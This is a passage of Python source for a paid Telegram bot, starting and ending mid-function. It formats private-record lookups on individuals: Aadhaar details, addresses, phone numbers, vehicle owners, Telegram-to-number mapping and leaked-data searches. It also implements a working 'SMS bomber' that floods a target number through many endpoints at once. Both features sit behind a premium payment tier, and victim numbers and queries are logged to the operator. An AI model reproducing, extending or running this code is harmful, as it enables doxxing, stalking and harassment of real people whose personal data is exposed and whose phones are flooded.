    is_sarkari_vehicle    = flags.get('is_sarkari_vehicle', False)
    is_v2n                = flags.get('is_v2n', False)

    if not data:
        return f"`❌ No data`\n`🔎 Query: {V(query)}`"

    # ---------- Ansh Number ----------
    if is_ansh:
        try:
            d = data.get('Data') or data.get('data') or {}
            if not isinstance(d, dict): d = {}
            main = d.get('Main_Records') or d.get('main_records') or []
            alt  = d.get('Alt_Records')  or d.get('alt_records')  or []
            if not main and not alt:
                recs = _find_records(data)
                if recs:
                    return _records_to_text(recs, query, "NUMBER INTEL (Ansh)")
                return f"`❌ No records found`\n`🔎 Query: {V(query)}`"
            text = f"`📱 NUMBER INTEL (Ansh)`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🎯 Query: {V(query)}`\n"
            if main:
                rec = main[0]
                text += (
                    f"`👤 Name: {V(_get_ci(rec, 'name', 'Name'))}`\n"
                    f"`👨 Father: {V(_get_ci(rec, 'fname', 'father', 'Father'))}`\n"
                    f"`📱 Mobile: {V(_get_ci(rec, 'mobile', 'phone', 'number'))}`\n"
                    f"`🏠 Address: {V(_get_ci(rec, 'address', 'addr'))[:120]}`\n"
                    f"`📡 Circle: {V(_get_ci(rec, 'circle', 'operator'))}`\n"
                    f"`🆔 ID: {V(_get_ci(rec, 'id', 'aadhaar'))}`\n"
                    f"`📧 Email: {V(_get_ci(rec, 'email'))}`\n"
                    f"`📞 Alt: {V(_get_ci(rec, 'alt', 'alt_number'))}`\n"
                )
            if alt:
                text += f"\n`📊 Alt Records: {len(alt)}`\n"
                for i, rec in enumerate(alt[:2], 1):
                    text += f"`  #{i}: {V(_get_ci(rec,'mobile','phone'))} — {V(_get_ci(rec,'name'))}`\n"
            text += f"`🔐 {OWNER}`"
            return text
        except Exception:
            recs = _find_records(data)
            if recs:
                return _records_to_text(recs, query, "NUMBER INTEL")
            return f"`📱 NUMBER`\n`🎯 {V(query)}`\n`📊 {V(str(data))[:400]}`\n`🔐 {OWNER}`"

    # ---------- Leak OSINT ----------
    if is_leak_number or is_leak_email:
        label = "LEAK OSINT — NUMBER" if is_leak_number else "LEAK OSINT — EMAIL"
        recs = _find_records(data)
        if recs:
            return _records_to_text(recs, query, label, max_records=5)
        # Fallback: show raw keys
        if isinstance(data, dict):
            text = f"`🔎 {label}`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🎯 Query: {V(query)}`\n"
            for k, v in list(data.items())[:15]:
                if isinstance(v, (dict, list)): continue
                if v is None or str(v).strip().lower() == 'null': continue
                text += f"`  • {V(str(k))[:20]}: {V(str(v))[:100]}`\n"
            text += f"`🔐 {OWNER}`"
            return text
        return f"`🔎 {label}`\n`🎯 {V(query)}`\n`📊 {V(str(data))[:400]}`\n`🔐 {OWNER}`"

    # ---------- Sarkari Vehicle ----------
    if is_sarkari_vehicle:
        return _format_vehicle(data, query, "VEHICLE")

    # ---------- Vehicle→Number ----------
    if is_v2n:
        return _format_v2n(data, query)

    # ---------- Sarkari Aadhaar ----------
    if is_sarkari_aadhaar or is_aadhaar:
        return _format_aadhaar(data, query, "AADHAAR")

    # ---------- Sarkari Num ----------
    if is_sarkari_num:
        recs = _find_records(data)
        if recs:
            return _records_to_text(recs, query, "NUMBER INTEL (Sarkari)")
        return _format_number(data, query, "NUMBER")

    # ---------- Aadhaar Special ----------
    if is_aadhaar_special:
        if not isinstance(data, dict) or data.get('status') != 'success':
            recs = _find_records(data)
            if recs: return _records_to_text(recs, query, "AADHAAR SPL")
            return "`❌ No data`"
        records = data.get('data', [])
        if not isinstance(records, list) or not records: return "`❌ No records`"
        return _records_to_text([r for r in records if isinstance(r, dict)], query, "AADHAAR SPECIAL")

    # ---------- Pakistan ----------
    if is_pakistan:
        if not isinstance(data, dict) or data.get('status') != 'success':
            recs = _find_records(data)
            if recs: return _records_to_text(recs, query, "PAKISTAN")
            return "`❌ No data`"
        result = data.get('result', {}) or {}
        records = result.get('records', []) if isinstance(result, dict) else []
        if not records: return "`❌ No records`"
        return _records_to_text([r for r in records if isinstance(r, dict)], query, "PAKISTAN")

    # ---------- TG Number ----------
    if is_tg_number:
        if not isinstance(data, dict) or data.get('status') != 'success':
            return "`❌ No data`"
        d = data.get('data', {})
        if not isinstance(d, dict) or not d: return "`❌ No records`"
        owner_num = _get_ci(d, 'Owner≠Number', 'Owner', 'owner')
        tg_id = _get_ci(d, 'TG -ID', 'TG-ID', 'tg_id', default=query)
        country = _get_ci(d, 'Country-Code', 'country')
        return (f"`📞 TG TO NUMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
                f"`🆔 TG ID: {V(tg_id)}`\n`📱 Owner Number: {V(owner_num)}`\n"
                f"`🌍 Country: {V(country)}`\n`🔐 {OWNER}`")

    # ---------- DarkApiX Special ----------
    if is_number_special:
        recs = _find_records(data)
        if recs:
            return _records_to_text(recs, query, "SPECIAL LOOKUP")
        return f"`❌ No records`\n`🔎 Query: {V(query)}`"

    # ---------- Vehicle Special ----------
    if is_special:
        if not isinstance(data, dict) or not data.get('reg_no'):
            recs = _find_records(data)
            if recs: return _records_to_text(recs, query, "VEHICLE SPL")
            return "`❌ Not found`"
        i = data.get('response', {}) or {}
        return (f"`🚘 VEHICLE SPECIAL`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
                f"`🚘 {V(data.get('reg_no'))}`\n"
                f"`👤 Owner: {V(_get_ci(i,'ownerName','owner_name'))}`\n"
                f"`🚗 Class: {V(_get_ci(i,'vehicle_class','class'))}`\n"
                f"`⛽ Fuel: {V(_get_ci(i,'fuel_type','fuel'))}`\n"
                f"`🔧 Engine: {V(_get_ci(i,'engine_no','engine'))}`\n"
                f"`🔩 Chassis: {V(_get_ci(i,'chassis_no','chassis'))}`\n"
                f"`📅 Reg: {V(_get_ci(i,'reg_date','regDate'))}`\n"
                f"`🏭 Model: {V(_get_ci(i,'maker_model','model'))}`\n"
                f"`🔐 {OWNER}`")

    # ---------- Legacy Vehicle ----------
    if is_vehicle:
        if not isinstance(data, dict) or not data.get('regNo'):
            recs = _find_records(data)
            if recs: return _records_to_text(recs, query, "VEHICLE")
            return "`❌ Not found`"
        i = data.get('response', {}) or {}; rto = i.get('rtoData', {}) or {}
        return (f"`🚗 VEHICLE INTEL`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
                f"`🚘 {V(data.get('regNo'))}`\n"
                f"`👤 Owner: {V(_get_ci(i,'ownerName'))}`\n"
                f"`🏭 Company: {V(_get_ci(i,'manufacturer'))}`\n"
                f"`🚗 Model: {V(_get_ci(i,'vehicle'))}`\n"
                f"`📅 Reg: {V(_get_ci(i,'regDate'))}`\n"
                f"`🏢 RTO: {V(_get_ci(rto,'rtoCode'))}`\n"
                f"`🏠 Address: {V(_get_ci(i,'presentAddress'))[:120]}`\n"
                f"`🔐 {OWNER}`")

    # ---------- Default ----------
    return _format_number(data, query, "NUMBER")

def _format_number(data, query, label):
    recs = _find_records(data)
    if recs:
        return _records_to_text(recs, query, label)
    if isinstance(data, dict):
        text = f"`📱 {label}`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🎯 Query: {V(query)}`\n"
        for k, v in list(data.items())[:12]:
            if isinstance(v, (dict, list)): continue
            if v is None or str(v).strip().lower() == 'null': continue
            text += f"`  • {V(str(k))[:20]}: {V(str(v))[:100]}`\n"
        text += f"`🔐 {OWNER}`"
        return text
    return f"`📱 {label}`\n`🎯 {V(query)}`\n`📊 {V(str(data))[:400]}`\n`🔐 {OWNER}`"

def _format_aadhaar(data, query, label):
    info = {}
    if isinstance(data, dict):
        for key in ['data', 'Data', 'result', 'Result']:
            if isinstance(data.get(key), dict):
                info = data[key]; break
        if not info: info = data
    if info and (_get_ci(info, 'name', 'Name') != 'N/A'):
        return (f"`🆔 {label}`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
                f"`🆔 {V(_get_ci(info,'aadhaar','aadhar','Aadhaar', default=query))}`\n"
                f"`👤 Name: {V(_get_ci(info,'name','Name'))}`\n"
                f"`👨 Father: {V(_get_ci(info,'father','fname','Father'))}`\n"
                f"`📅 DOB: {V(_get_ci(info,'dob','DOB'))}`\n"
                f"`⚥ Gender: {V(_get_ci(info,'gender','Gender'))}`\n"
                f"`🏠 Address: {V(_get_ci(info,'address','addr','Address'))[:120]}`\n"
                f"`📱 Phone: {V(_get_ci(info,'phone','mobile','Phone'))}`\n"
                f"`📧 Email: {V(_get_ci(info,'email','Email'))}`\n"
                f"`🔐 {OWNER}`")
    return _format_number(data, query, label)

def _format_vehicle(data, query, label):
    info = {}
    if isinstance(data, dict):
        for key in ['data', 'Data', 'result', 'Result', 'response', 'Response']:
            if isinstance(data.get(key), dict):
                info = data[key]; break
        if not info: info = data
    if info:
        return (f"`🚗 {label}`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
                f"`🚘 {V(_get_ci(info,'regNo','reg_no','registration_number', default=query))}`\n"
                f"`👤 Owner: {V(_get_ci(info,'ownerName','owner_name','owner'))}`\n"
                f"`🏭 Company: {V(_get_ci(info,'manufacturer','maker','company'))}`\n"
                f"`🚗 Model: {V(_get_ci(info,'vehicle','model','maker_model'))}`\n"
                f"`📅 Reg: {V(_get_ci(info,'regDate','reg_date','registration_date'))}`\n"
                f"`⛽ Fuel: {V(_get_ci(info,'fuel_type','fuel'))}`\n"
                f"`🔧 Engine: {V(_get_ci(info,'engine_no','engine_number'))}`\n"
                f"`🔩 Chassis: {V(_get_ci(info,'chassis_no','chassis_number'))}`\n"
                f"`🏠 Address: {V(_get_ci(info,'presentAddress','address','owner_address'))[:120]}`\n"
                f"`🔐 {OWNER}`")
    return _format_number(data, query, label)

def _format_v2n(data, query):
    info = data
    if isinstance(data, dict):
        for key in ['data', 'Data', 'result', 'Result']:
            if isinstance(data.get(key), dict):
                info = data[key]; break
    phone = _get_ci(info, 'mobile', 'phone', 'number', 'owner_mobile', 'owner_phone', default=None) if isinstance(info, dict) else None
    if not phone:
        try:
            found = re.findall(r'\b[6-9]\d{9}\b', json.dumps(data))
            phone = ', '.join(found[:3]) if found else 'N/A'
        except Exception:
            phone = 'N/A'
    owner = _get_ci(info, 'ownerName', 'owner_name', 'name') if isinstance(info, dict) else 'N/A'
    addr = _get_ci(info, 'address', 'presentAddress') if isinstance(info, dict) else 'N/A'
    return (f"`🚘 VEHICLE → NUMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
            f"`🚗 Vehicle: {V(query)}`\n"
            f"`👤 Owner: {V(owner)}`\n"
            f"`📱 Mobile: {V(phone)}`\n"
            f"`🏠 Address: {V(addr)[:120]}`\n"
            f"`🔐 {OWNER}`")

def send_log(uid, un, query, data, stype="NUMBER"):
    try:
        un_safe = M(un or 'N/A')
        q_safe = M(str(query))
        bot.send_message(ADMIN_ID, f"📊 {stype} LOG\n👤 @{un_safe} ({uid})\n🔍 {q_safe}")
    except Exception:
        try:
            bot.send_message(ADMIN_ID, f"📊 {stype} LOG\nUser: {uid}\nQuery: {query}")
        except Exception: pass

# ==================== SMS BOMBER ====================
def is_valid_number(num):
    return bool(re.match(r'^[6-9]\d{9}$', num or ''))

def send_bomber_request(url, number, message):
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'}
    for payload in [{'number': number, 'message': message},
                    {'num': number, 'msg': message},
                    {'mobile': number, 'text': message}]:
        try:
            r = requests.post(url, data=payload, headers=headers, timeout=5)
            if r.status_code in (200, 201, 202, 301, 302):
                return True
        except Exception: pass
    return False

def run_sms_bomber(chat_id, msg_id, number, message):
    total = len(BOMBER_URLS)
    success = 0
    failed = 0
    lock = threading.Lock()

    def hit_api(url):
        nonlocal success, failed
        result = send_bomber_request(url, number, message)
        with lock:
            if result: success += 1
            else: failed += 1
            done = success + failed
            if done % 3 == 0 or done == total:
                percent = int((done / total) * 100)
                filled = percent // 10
                bar = "🟥" * filled + "⬛" * (10 - filled)
                safe_edit(chat_id, msg_id,
                    f"`💥 SMS BOMBER`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
                    f"`📱 {V(number)}`\n`💬 {V(message)[:25]}`\n"
                    f"{bar} `{percent}%`\n"
                    f"`✅ {success} | ❌ {failed} | {done}/{total}`",
                    parse_mode='Markdown')

    threads = []
    for url in BOMBER_URLS:
        t = threading.Thread(target=hit_api, args=(url,), daemon=True)
        threads.append(t); t.start()

    for t in threads:
        try: t.join(timeout=8)
        except Exception: pass

    rate = int((success / total) * 100) if total else 0
    verdict = "🔥 SUCCESSFUL" if rate >= 70 else "⚠️ PARTIAL" if rate >= 40 else "❌ FAILED"
    safe_edit(chat_id, msg_id,
        f"`💥 ATTACK COMPLETE`\n`━━━━━━━━━━━━━━━━━━━━━`\n"
        f"`📱 {V(number)}`\n`💬 {V(message)[:40]}`\n"
        f"`━━━━━━━━━━━━━━━━━━━━━`\n"
        f"`✅ SUCCESS : {success}`\n`❌ FAILED  : {failed}`\n"
        f"`📊 RATE    : {rate}%`\n`🎯 VERDICT : {verdict}`\n"
        f"`🔐 {OWNER}`",
        parse_mode='Markdown')

    try:
        bot.send_message(ADMIN_ID, f"💥 BOMBER LOG\n👤 {chat_id}\n📱 {number}\n💬 {message}\n✅ {success}/{total}")
    except Exception: pass

# ==================== KEYBOARDS ====================
def welcome_kb(l):
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(InlineKeyboardButton("🎁 FREE Daily Coin Claim", callback_data="claim_coin"))
    mk.add(InlineKeyboardButton("💳 Buy Premium", callback_data="show_premium"))
    mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
    return mk

def premium_plans_kb(l):
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(InlineKeyboardButton("💳 1 Day – ₹10", callback_data="pay_1day"))
    mk.add(InlineKeyboardButton("💳 1 Week – ₹60", callback_data="pay_7days"))
    mk.add(InlineKeyboardButton("💳 1 Month – ₹101", callback_data="pay_30days"))
    mk.add(InlineKeyboardButton("🔙 Back", callback_data="back_to_welcome"))
    return mk

def main_menu(l):
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("🔍 " + L[l]['search'], callback_data="search_menu"))
    mk.add(InlineKeyboardButton("💥 SMS Bomber", callback_data="bomber_start"))
    mk.add(InlineKeyboardButton("💎 " + L[l]['premium'], callback_data="show_premium"))
    mk.add(InlineKeyboardButton("🎁 Claim Coin", callback_data="claim_coin"))
    mk.add(InlineKeyboardButton("👤 " + L[l]['profile_btn'], callback_data="profile"))
    mk.add(InlineKeyboardButton("❓ " + L[l]['help_btn'], callback_data="help"))
    mk.add(InlineKeyboardButton("ℹ️ " + L[l]['about_btn'], callback_data="about"))
    mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
    mk.add(InlineKeyboardButton("📢 Channel", url=CHANNEL))
    mk.add(InlineKeyboardButton(L[l]['clear_btn'], callback_data="clear"))
    return mk

def search_menu(l):
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("📱 Number", callback_data="info"),
        InlineKeyboardButton("🚗 Vehicle", callback_data="vehicle_info"),
        InlineKeyboardButton("🚘 Vehicle Spl", callback_data="vehicle_special_info"),
        InlineKeyboardButton("🆔 Aadhaar", callback_data="aadhaar_info"),
        InlineKeyboardButton("🔍 Special", callback_data="special_info"),
        InlineKeyboardButton("🆔 Aadhaar Spl", callback_data="aadhaar_special_info"),
        InlineKeyboardButton("📞 TG to Num", callback_data="tg_number_info"),
        InlineKeyboardButton("🇵🇰 Pakistan", callback_data="pakistan_info"),
        InlineKeyboardButton("🔎 Leak Number", callback_data="leak_number_info"),
        InlineKeyboardButton("📧 Leak Email", callback_data="leak_email_info"),
        InlineKeyboardButton("🚘 Vehicle→Num", callback_data="v2n_info")
    )
    mk.add(InlineKeyboardButton("🔙 Back", callback_data="main_menu"))
    return mk

def group_menu(l):
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("📱 Number", callback_data="info"),
        InlineKeyboardButton("🚗 Vehicle", callback_data="vehicle_info"),
        InlineKeyboardButton("🆔 Aadhaar", callback_data="aadhaar_info"),
        InlineKeyboardButton("🔍 Special", callback_data="special_info"),
        InlineKeyboardButton("🔎 Leak Number", callback_data="leak_number_info"),
        InlineKeyboardButton("📧 Leak Email", callback_data="leak_email_info"),
        InlineKeyboardButton("🚘 Vehicle→Num", callback_data="v2n_info")
    )
    mk.add(InlineKeyboardButton("💥 SMS Bomber", callback_data="bomber_start"))
    mk.add(InlineKeyboardButton("💎 Premium", callback_data="show_premium"))
    mk.add(InlineKeyboardButton("🎁 Claim Coin", callback_data="claim_coin"))
    mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
    return mk

def result_btn(query, lang, flags="0000000000000", message_id=None, is_group=False):
    """Use query cache for callback_data to avoid 64-byte overflow."""
    token = cache_query(query, flags)
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("📊 JSON", callback_data=f"j_{token}"))
    mk.add(InlineKeyboardButton("🌐 Website", url=WEBSITE))
    mk.add(InlineKeyboardButton("🔗 Group", url=GROUP))
    mk.add(InlineKeyboardButton("🗑️ " + L[lang]['clear_btn'], callback_data="clear"))
    mk.add(InlineKeyboardButton("🔙 " + L[lang]['back'], callback_data="main_menu"))
    if is_group and message_id:
        mk.add(InlineKeyboardButton("📌 Pin", callback_data=f"pin_{message_id}"))
    return mk

def back_btn(l):
    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("🔙 " + L[l]['back'], callback_data="main_menu"))
    return mk

def lang_selection():
    mk = InlineKeyboardMarkup(row_width=3)
    mk.add(
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
        InlineKeyboardButton("🇮🇳 हिन्दी", callback_data="lang_hi"),
        InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn"),
        InlineKeyboardButton("🇮🇳 मराठी", callback_data="lang_mr"),
        InlineKeyboardButton("🇵🇰 اُردو", callback_data="lang_ur"),
        InlineKeyboardButton("🇮🇳 தமிழ்", callback_data="lang_ta")
    )
    return mk

def send_welcome_with_qr(chat_id, l, edit_message_id=None):
    caption = L[l]['welcome']
    kb = welcome_kb(l)
    try:
        with open(QR_PATH, 'rb') as qr:
            if edit_message_id:
                try: bot.delete_message(chat_id, edit_message_id)
                except Exception: pass
            bot.send_photo(chat_id, qr, caption=caption, reply_markup=kb, parse_mode='Markdown')
    except Exception:
        try:
            bot.send_message(chat_id, caption, reply_markup=kb, parse_mode='Markdown')
        except Exception:
            try: bot.send_message(chat_id, caption, reply_markup=kb)
            except Exception: pass

# ==================== CALLBACKS ====================
@bot.callback_query_handler(func=lambda c: c.data.startswith('lang_'))
def lc(c):
    try:
        l = c.data.split('_', 1)[1]
        if l not in L: l = 'en'
        sl(c.from_user.id, l)
        ensure_user(c.from_user.id, c.from_user.first_name or "User", c.from_user.username or "")
        try: bot.delete_message(c.message.chat.id, c.message.message_id)
        except Exception: pass
        send_welcome_with_qr(c.message.chat.id, l)
        bot.answer_callback_query(c.id, "✅")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "claim_coin")
def claim_coin_cb(c):
    try:
        l = gl(c.from_user.id)
        ensure_user(c.from_user.id, c.from_user.first_name or "User", c.from_user.username or "")
        if claim_daily_coin(c.from_user.id):
            coins = gc(c.from_user.id)
            bot.answer_callback_query(c.id, f"🎉 +1 Coin! Total: {coins}")
            safe_send(c.message.chat.id, L[l]['coin_claimed'].format(coins=coins),
                      reply_markup=main_menu(l), parse_mode='Markdown')
        else:
            bot.answer_callback_query(c.id, "❌ Already claimed!", True)
            safe_send(c.message.chat.id, L[l]['already_claimed'], reply_markup=main_menu(l))
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "show_premium")
def show_premium_cb(c):
    try:
        l = gl(c.from_user.id)
        if ip(c.from_user.id):
            bot.answer_callback_query(c.id, "💎 Already Premium!", True); return
        sent = False
        try:
            with open(QR_PATH, 'rb') as qr:
                bot.send_photo(c.message.chat.id, qr, caption=L[l]['welcome'],
                               reply_markup=premium_plans_kb(l), parse_mode='Markdown')
                sent = True
        except Exception: pass
        if not sent:
            safe_send(c.message.chat.id, L[l]['welcome'], reply_markup=premium_plans_kb(l), parse_mode='Markdown')
        bot.answer_callback_query(c.id, "💎 Plans")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "back_to_welcome")
def back_welcome_cb(c):
    try:
        l = gl(c.from_user.id)
        try: bot.delete_message(c.message.chat.id, c.message.message_id)
        except Exception: pass
        send_welcome_with_qr(c.message.chat.id, l)
        bot.answer_callback_query(c.id, "🔙")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith('pay_'))
def pay_cb(c):
    try:
        l = gl(c.from_user.id)
        plan = c.data.split('_', 1)[1]
        plan_map = {'1day': (1, '₹10'), '7days': (7, '₹60'), '30days': (30, '₹101')}
        if plan not in plan_map:
            bot.answer_callback_query(c.id, "❌ Invalid", True); return
        days, amount = plan_map[plan]
        bot.answer_callback_query(c.id, f"💳 {amount}")
        text = (f"💳 **Payment**\n\n📦 Plan: {days} Days\n💰 {amount}\n"
                f"🏦 UPI: `{UPI_ID}`\n📤 Send screenshot to @Cyber_With_Ranjan")
        sent = False
        try:
            with open(QR_PATH, 'rb') as qr:
                bot.send_photo(c.message.chat.id, qr, caption=text, parse_mode='Markdown')
                sent = True
        except Exception: pass
        if not sent:
            safe_send(c.message.chat.id, text, parse_mode='Markdown')
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "bomber_start")
def bomber_start_cb(c):
    try:
        uid = c.from_user.id
        ensure_user(uid, c.from_user.first_name or "User", c.from_user.username or "")
        if not ip(uid):
            bot.answer_callback_query(c.id, "💎 Premium Required!", True)
            mk = InlineKeyboardMarkup(row_width=1)
            mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
            mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
            safe_send(c.message.chat.id, "🔒 **SMS BOMBER — Premium Only**", reply_markup=mk, parse_mode='Markdown')
            return
        with BOMBER_LOCK:
            BOMBER_STATE[uid] = {"step": "number", "number": "", "message": ""}
        bot.answer_callback_query(c.id, "💥 SMS Bomber")
        safe_send(c.message.chat.id, "💥 **SMS BOMBER v3.0**\n\n📱 Send 10-digit number:\n`9876543210`\n\n💡 Fast: `/boom 9876543210 Message`", parse_mode='Markdown')
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data in ("bomber_confirm", "bomber_confirm_direct"))
def bomber_confirm_cb(c):
    try:
        uid = c.from_user.id
        with BOMBER_LOCK:
            state = BOMBER_STATE.get(uid)
        if not state or state.get("step") != "confirm":
            bot.answer_callback_query(c.id, "❌ Session expired!", True); return
        number = state.get("number", "")
        message = state.get("message", "")
        bot.answer_callback_query(c.id, "💥 Launching!")
        try: bot.delete_message(c.message.chat.id, c.message.message_id)
        except Exception: pass
        try:
            msg = bot.send_message(c.message.chat.id, "`💥 LAUNCHING...`", parse_mode='Markdown')
            threading.Thread(target=run_sms_bomber,
                             args=(c.message.chat.id, msg.message_id, number, message),
                             daemon=True).start()
        except Exception:
            safe_send(c.message.chat.id, "❌ Error launching bomber.")
        with BOMBER_LOCK:
            BOMBER_STATE.pop(uid, None)
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "bomber_cancel")
def bomber_cancel_cb(c):
    try:
        uid = c.from_user.id
        with BOMBER_LOCK:
            BOMBER_STATE.pop(uid, None)
        try: bot.delete_message(c.message.chat.id, c.message.message_id)
        except Exception: pass
        bot.answer_callback_query(c.id, "❌ Cancelled")
        safe_send(c.message.chat.id, "❌ Cancelled.", reply_markup=main_menu(gl(uid)))
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda cb: cb.data == "profile")
def profile_cb(cb):
    try:
        uid = cb.from_user.id
        ensure_user(uid, cb.from_user.first_name or "User", cb.from_user.username or "")
        coins = gc(uid)
        prem = "✅ Active" if ip(uid) else "❌ Inactive"
        searches = 0
        try:
            with _db_lock:
                cur = conn.cursor()
                cur.execute("SELECT searches FROM users WHERE user_id=?", (uid,))
                r = cur.fetchone(); searches = r[0] if r else 0
        except Exception: pass
        l = gl(uid)
        bot.answer_callback_query(cb.id, "👤")
        safe_send(cb.message.chat.id,
                  L[l]['profile'].format(uid=uid, coins=coins, prem=prem, searches=searches),
                  parse_mode='Markdown')
    except Exception:
        try: bot.answer_callback_query(cb.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "help")
def help_cb(c):
    try:
        l = gl(c.from_user.id)
        bot.answer_callback_query(c.id, "❓")
        safe_send(c.message.chat.id, L[l]['help'], reply_markup=back_btn(l), parse_mode='Markdown')
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "about")
def about_cb(c):
    try:
        l = gl(c.from_user.id)
        safe_send(c.message.chat.id, L[l]['about'] + f"\n🌐 {WEBSITE}",
                  reply_markup=back_btn(l), parse_mode='Markdown')
        bot.answer_callback_query(c.id, "ℹ️")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "clear")
def clear_cb(c):
    try:
        bot.delete_message(c.message.chat.id, c.message.message_id)
        bot.answer_callback_query(c.id, "🗑️")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌", True)
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "main_menu")
def main_menu_cb(c):
    try:
        l = gl(c.from_user.id)
        if ip(c.from_user.id):
            text = f"{L[l]['main_menu']}\n\n💎 **Premium** — Unlimited"
        else:
            coins = gc(c.from_user.id)
            text = f"{L[l]['main_menu']}\n\n🪙 **Coins:** {coins}"
        try:
            bot.edit_message_text(text, c.message.chat.id, c.message.message_id,
                                  reply_markup=main_menu(l), parse_mode='Markdown')
        except Exception:
            safe_send(c.message.chat.id, text, reply_markup=main_menu(l), parse_mode='Markdown')
        bot.answer_callback_query(c.id, "🔙")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data == "search_menu")
def search_menu_cb(c):
    try:
        l = gl(c.from_user.id)
        coins_info = ""
        if not ip(c.from_user.id):
            coins = gc(c.from_user.id)
            coins_info = f"\n\n🪙 Coins Left: **{coins}**"
        text = "🔍 " + L[l]['search'] + coins_info
        try:
            bot.edit_message_text(text, c.message.chat.id, c.message.message_id,
                                  reply_markup=search_menu(l), parse_mode='Markdown')
        except Exception:
            safe_send(c.message.chat.id, text, reply_markup=search_menu(l), parse_mode='Markdown')
        bot.answer_callback_query(c.id, "🔍")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data in
    ["info", "vehicle_info", "vehicle_special_info", "aadhaar_info", "special_info",
     "aadhaar_special_info", "tg_number_info", "pakistan_info",
     "leak_number_info", "leak_email_info", "v2n_info"])
def info_cb(c):
    try:
        l = gl(c.from_user.id)
        if not ip(c.from_user.id):
            coins = gc(c.from_user.id)
            if coins <= 0:
                bot.answer_callback_query(c.id, "❌ No coins!", True)
                mk = InlineKeyboardMarkup(row_width=1)
                mk.add(InlineKeyboardButton("🎁 Claim FREE Coin", callback_data="claim_coin"))
                mk.add(InlineKeyboardButton("💎 Buy Premium", callback_data="show_premium"))
                safe_send(c.message.chat.id, "❌ No coins! Claim daily FREE coin.", reply_markup=mk)
                return
        prompts = {
            "aadhaar_info": L[l]['enter_aadhaar'],
            "vehicle_special_info": L[l]['enter_vehicle_special'],
            "vehicle_info": L[l]['enter_vehicle'],
            "special_info": L[l]['enter_special'],
            "aadhaar_special_info": L[l]['enter_aadhaar_special'],
            "tg_number_info": L[l]['enter_tg_number'],
            "pakistan_info": L[l]['enter_pakistan'],
            "leak_number_info": L[l]['enter_leak_number'],
            "leak_email_info": L[l]['enter_leak_email'],
            "v2n_info": L[l]['enter_v2n'],
            "info": L[l]['enter_number']
        }
        safe_send(c.message.chat.id, prompts.get(c.data, L[l]['enter_number']))
        bot.answer_callback_query(c.id, "🔍")
    except Exception:
        try: bot.answer_callback_query(c.id, "❌")
        except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith('j_'))
def json_cb(c):
    """JSON button — uses cached query token."""
    try:
        token = c.data[2:]
        cached = get_cached_query(token)
        if not cached:
            bot.answer_callback_query(c.id, "❌ Session expired", True); return
        q, flags = cached
        bot.answer_callback_query(c.id, "📊 Loading...")

        # Parse flags: 13 chars
        flags = (flags or "0000000000000")[:13].ljust(13, '0')
        f = [1 if ch == '1' else 0 for ch in flags]
        # 0:vehicle 1:special 2:aadhaar 3:number_special 4:aadhaar_special 5:tg 6:pk
        # 7:rezone 8:ansh 9:sarkari_num 10:sarkari_aadhaar 11:leak_num 12:leak_email

        d = None
        if   f[8]:  d = fetch_ansh_number(q)
        elif f[9]:  d = fetch_sarkari_num(q)
        elif f[11] or f[12]: d = fetch_leak_osint(q)
        elif f[10] or f[2]:  d = fetch_sarkari_aadhaar(q)
        elif f[4]:  d = fetch_aadhaar_special(q)
        elif f[6]:  d = fetch_pakistan(q)
        elif f[5]:  d = fetch_tg_number(q)
        elif f[3]:  d = fetch_special(q)
        elif f[1]:  d = fetch_vehicle_special(q)
